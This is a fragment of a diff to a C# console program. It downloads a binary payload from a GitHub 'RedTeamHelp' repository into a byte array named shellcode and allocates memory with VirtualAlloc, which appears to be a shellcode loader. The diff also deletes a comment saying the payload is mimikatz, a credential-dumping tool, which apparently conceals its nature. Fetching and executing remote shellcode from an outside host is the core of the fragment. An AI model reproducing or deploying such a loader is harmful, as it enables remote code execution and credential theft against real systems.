@@ -1,5 +1,3 @@
-using System;
-using System.IO;
 using System.Net;
 using System.Runtime.InteropServices;
 
@@ -34,7 +32,7 @@ namespace ConsoleApp
             // Create a WebClient instance to download the .bin file
             using (WebClient webClient = new WebClient())
             {
-                // Download the .bin file as a byte array. mimikatz is whats below.
+                // Download the .bin file as a byte array
                 byte[] shellcode = webClient.DownloadData("https://github.com/kyle41111/RedTeamHelp/raw/main/payload.bin");
 
                 // Allocate memory for the shellcode with VirtualAlloc
